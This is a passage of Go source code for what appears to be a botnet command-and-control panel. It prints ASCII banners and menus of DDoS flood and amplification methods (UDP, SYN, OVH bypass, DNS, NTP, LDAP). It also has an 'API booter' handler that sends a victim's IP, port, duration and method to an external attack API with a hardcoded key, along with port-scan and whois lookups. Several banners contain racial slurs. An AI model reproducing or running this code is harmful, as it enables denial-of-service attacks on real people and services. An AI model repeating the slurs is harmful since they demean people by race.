            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[37m           / == /       \r\n"))
            this.conn.Write([]byte("\033[37m            |  |        \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                                        this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[99m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[93m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[93m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[93m|                         |        \r\n"))
            this.conn.Write([]byte("\033[93m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[97m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[93m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[93m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[93m          | ;  :|    nuke          \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga got\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga got \033[93mNUKED\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
        }//if userInfo.admin == 1 && cmd == "ADDREG"
        if userInfo.admin == 1 && cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[93m                      ╔══════════════════\033[37m═══════════════════╗\r\n"))
            this.conn.Write([]byte("\033[93m                      ║ ADDREG - Create a\033[37m Regular Account   ║\r\n"))
            this.conn.Write([]byte("\033[93m                      ║ REMOVEUSER - Remo\033[37mve an Account      ║\r\n"))
            this.conn.Write([]byte("\033[93m                      ╚══════════════════\033[37m═══════════════════╝\r\n"))
            continue
        }
            if err != nil || cmd == "@" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[93m                       nice\033[37mtry\r\n"))
            continue
        }
            if err != nil || cmd == "ban" || cmd == "BAN" || cmd == "banners" || cmd == "BANNERS" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[93m                       ╔═════════════════\033[37m════════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                       ║ PUZ1 - Puzzles b\033[37manner1              ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                       ║ TROLL - TROLL ba\033[37mnner                ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                       ╚═════════════════\033[37m════════════════════╝\x1b[37m\r\n"))
            continue
        }//BANNERS
                    if err != nil || cmd == "offline" || cmd == "OFFLINE" || cmd == "api" || cmd == "API" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                        ╔════════════════\033[93m══════════════╗  \r\n"))
            this.conn.Write([]byte("\033[37m                        ║      ┌┐ ┌─┐┌┬┐┌\033[93m┬┐┌─┐┌┐┌      ║  \r\n"))
            this.conn.Write([]byte("\033[37m                        ║      ├┴┐├─┤ │ │\033[93m││├─┤│││      ║  \r\n"))
            this.conn.Write([]byte("\033[37m                        ║      └─┘┴ ┴ ┴ ┴\033[93m ┴┴ ┴┘└┘      ║  \r\n"))
            this.conn.Write([]byte("\033[37m                ╔═══════╚════════════════\033[93m══════════════╝════════╗    \r\n"))
            this.conn.Write([]byte("\033[37m                ║              BATMAN WIN\033[93mS @IOTNET              ║    \r\n"))
            this.conn.Write([]byte("\033[37m                ╚════════════════════════\033[93m═══════════════════════╝    \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[93m                  ╔══════════════════════\033[37m════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[93m                  ║ OFFLINE-VIP - offline\033[37m network - vip          ║\r\n"))
            this.conn.Write([]byte("\033[93m                  ║ OFFLINE-NORMAL - offl\033[37mine network - normal    ║\r\n"))
            this.conn.Write([]byte("\033[93m                  ╚══════════════════════\033[37m════════════════════════╝\r\n"))
            continue
        }//BANNERS
                    if err != nil || cmd == "creds" || cmd == "credits" || cmd == "CREDS" || cmd == "CREDITS" {
                        this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[93m                   ╔═════════════════════\033[93m════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ @blazing_runs - main\033[93m developer              ║\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ @blazing_runs - CNC \033[93mdesigner                ║\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ @AZ1L - idea giver  \033[93m                        ║\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ @iopoo - stole his i\033[93mdea                     ║\r\n"))
            this.conn.Write([]byte("\033[93m                   ╚═════════════════════\033[93m════════════════════════╝\r\n"))
            continue
        }//credits

                if err != nil || cmd == "troll" || cmd == "TROLL" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m  \033[93mWELL.. LOOKS LIKE \033[37m" + username + "!\033[93m GOT TROLLED!!!        \r\n")))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  \r\n"))
            this.conn.Write([]byte("\033[37m   ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[93m       YEET NIGGA WRECKED \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }
                if err != nil || cmd == "PUZ1" || cmd == "puz1" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m  \033[93mpuzzled??? \033[37m" + username + " !          \r\n")))
            this.conn.Write([]byte("\033[37m                       _      _      _      _      _      _      _      \r\n"))
            this.conn.Write([]byte("\033[37m                     _( )__ _( )__ _( )__ _( )__ _( )__ _( )__ _( )__   \r\n"))
            this.conn.Write([]byte("\033[37m                   _|     _|     _|     _|     _|     _|     _|     _|  \r\n"))
            this.conn.Write([]byte("\033[37m                  (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m                   |_     |_     |_     |_     |_     |_     |_     |_  \r\n"))
            this.conn.Write([]byte("\033[37m                    _) _   _) _   _) _   _) _   _) _   _) _   _) _   _) \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m                   _|     _|     _|     _|     _|     _|     _|     _|  \r\n"))
            this.conn.Write([]byte("\033[37m                  (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m                   |_     |_     |_     |_     |_     |_     |_     |_  \r\n"))
            this.conn.Write([]byte("\033[37m                    _) _   _) _   _) _   _) _   _) _   _) _   _) _mx _) \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[93m                                 puzzle net v4 by blazing \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }   
        if err != nil || cmd == "public" || cmd == "PUBLIC" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[93m                   ╔═══════════════════\033[37m════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .udp [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .vse [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .ice [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .syn [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .ack [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .ovh [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .game [ip] [time] \033[37mdport=[port]        ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .xmas [ip] [time] \033[37mdport=[port]        ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .frag [ip] [time] \033[37mdport=[port]        ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .stomp [ip] [time]\033[37m dport=[port]       ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .greip [ip] [time]\033[37m dport=[port]       ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .stdhex [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .udphex [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .greeth [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .tcpall [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .udpplain [ip] [ti\033[37mme] dport=[port]    ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ╚═══════════════════\033[37m════════════════════╝   \033[0m \r\n"))
            continue
        }
                if err != nil || cmd == "private" || cmd == "PRIVATE" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       ╔══════════════════\033[93m════════════════════╗       \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                       ║       THE GOOD GU\033[93mY ALWAYS WINS       ║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ╔═══╩══════════════════\033[93m════════════════════╩═══╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ║ .killall [ip] [time] \033[93mdport=[port]            ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ║ .nfodown [ip] [time] \033[93mdport=[port]            ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ║ .randhex [ip] [time] \033[93mdport=[port]            ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ║ .raid [ip] [time] dpo\033[93mrt=[port]               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ║ .kpac [ip] [time] dpo\033[93mrt=[port]               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ║ .ovh2 [ip] [time] dpo\033[93mrt=[port]               ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                   ╚══════════════════════\033[93m════════════════════════╝   \033[0m \r\n"))
            continue
        }
        if err != nil || cmd == "TOOLS" || cmd == "tools" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[93m                   ╔════════════════\033[37m═══════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -ping - Ping an\033[37m IPv4              ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -iplookup - Loo\033[37mkup IPv4           ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -portscan - Por\033[37mtscan IPv4         ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -resolve - Reso\033[37mlve a URL          ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -reversedns - F\033[37mind DNS of an IPv4 ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -asnlookup - Fi\033[37mnd ASN of an IPv4  ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -traceroute - T\033[37mraceroute On IPv4  ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -subnetcalc - C\033[37malculate A Subnet  ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -whois - WHOIS \033[37mSearch             ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ║ -zonetransfer -\033[37m Shows ZT          ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[93m                   ╚════════════════\033[37m═══════════════════╝\x1b[37m\r\n"))
            continue
        }
        if err != nil || cmd == "spoof" || cmd == "SPOOF" {//max attack is 400s
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[37m╔═══════════\033[93m══════════╗╔═══════════════════════╗ \r\n"))
            this.conn.Write([]byte("\033[37m║      STD  \033[93m          ║║ Send!! - .spoof-send  ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      UDP  \033[93m          ║║═══════════════════════║ \r\n"))
            this.conn.Write([]byte("\033[37m║      SERVE\033[93mR         ║║      Methods :        ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      SOURC\033[93mE         ║║      RIP              ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      VOX  \033[93m          ║║      FN-LAG           ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      TCPKI\033[93mLL        ║║      R6-LAG           ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      UDPKI\033[93mLL        ║║      DNS              ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      UBNT \033[93m          ║║      LDAP             ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      UBNTX\033[93m          ║║      SSDP             ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      FORTN\033[93mITE-LAG   ║║      NTP              ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      R6   \033[93m          ║║      TCP              ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      FORTN\033[93mITE       ║║      UDPBLEND         ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      RAWHE\033[93mX         ║║      XSYN             ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      RAWTC\033[93mP         ║║      CHARGEN          ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      SOAP \033[93m          ║║      XACK             ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      OVH-C\033[93mRUSH      ║║      XMAS             ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      OVH-L\033[93mAG        ║║      OVHBYPASS        ║ \r\n"))
            this.conn.Write([]byte("\033[37m║      OVH-D\033[93mOWN       ║╚═══════════════════════╝ \r\n"))
            this.conn.Write([]byte("\033[37m╚═══════════\033[93m══════════╝                                  \r\n"))
            this.conn.Write([]byte("\033[37m                                                                 \r\n"))
            continue
        }
                /////////////// API BOOTER
        if err != nil || cmd == ".spoof-send" || cmd == ".SPOOF-SEND" {
            this.conn.Write([]byte("\033[37m                                ║IPv4\033[93m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[37m                                ║Port\033[93m: \x1b[0m"))
            port, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[37m                                ║Time\033[93m: \x1b[0m"))
            timee, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[37m                                ║Method\033[93m: \x1b[0m"))
            method, err := this.ReadLine(false)
            if err != nil {
                return
            }//https://securityteamapi.io/api.php?ip=[host]&port=[port]&time=[time]&method=[method]&vip=[vip]&user=BlazingOVH1&key=********
            url := "http://trivesecurity.xyz:5000/api/botnet/?key=rxyOi1MhkhcD5Yms&host=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m\033[37m                              ║Sent.\033[31m if did not send please wait 5m\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                              ║Error... IP Address Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93m                              ║API Server Result\033[93m: \r\n\033[93m" + locformatted + "\x1b[0m\r\n"))
        }
        ///////////////////////// END OF API BOOTER
        ///////////////////////// anti crash
        if strings.Contains(cmd, "@") {
            continue
        }
        ///////////////////////// END OF API BOOTER
            if err != nil || cmd == "-IPLOOKUP" || cmd == "-iplookup" {
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResults\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

        if err != nil || cmd == "-PORTSCAN" || cmd == "-portscan" {                  
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResults\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-WHOIS" || cmd == "-whois" {
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResults\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-PING" || cmd == "-ping" {
